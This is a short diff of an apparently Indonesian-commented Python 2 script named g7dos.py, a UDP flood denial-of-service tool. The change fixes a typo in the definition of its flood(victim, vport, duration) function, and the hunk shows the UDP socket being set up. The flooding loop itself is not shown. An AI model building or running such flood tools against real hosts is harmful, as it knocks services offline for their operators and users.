@@ -10,7 +10,7 @@ def usage():
     print "||========================||"
     print "Cara :"
     print "Command: python2 g7dos.py <ip> <port> <packet>"
-ef flood(victim, vport, duration):
+def flood(victim, vport, duration):
     # Support us yaakk... :)
     # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
